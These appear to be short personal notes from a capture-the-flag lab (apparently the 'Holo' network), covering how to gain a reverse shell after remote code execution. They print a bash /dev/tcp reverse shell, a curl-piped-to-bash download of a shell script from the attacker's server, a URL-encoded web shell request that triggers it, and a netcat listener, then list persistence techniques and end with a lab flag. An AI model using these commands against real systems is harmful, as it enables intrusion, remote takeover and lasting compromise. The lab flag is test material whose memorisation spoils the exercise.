
One thing to keep in mind that: How to get a reverse shell on a box once you have RCE:
- netcat 
- bash 
- python 
- perl


To start up a local web server on your attacking machine:
- http.server
- updog
- php

Reverse Shell
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.50.104.169/4242 0>&1
```

Now will use the RCE vulnerability and try to load the payload and trigger it using the bash command which will run the payload and we should get the reverse shell 
```
curl http://10.50.104.169:8080/rev_shell.sh|bash &
```

So what to do after we gained a decent foothold and have a stable shell. Like we don't want to lose our foothold and redo the work if the machine is reset or our shell get's terminated.

SO different methods for persistence: LD_PRELOAD Backdoored binaries PAM backdoor SSH keys Malicious Services Cronjob Credential harvesting


```
curl 192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.169%3A8080%2Frev_shell.sh%7Cbash%20%26
```
![[Pasted image 20240219212157.png]]


![[Pasted image 20240219212210.png]]


```
nc -lvnp 4242
```
![[Pasted image 20240219212229.png]]


```
HOLO{3792d7d80c4dcabb8a533afddf06f666}
```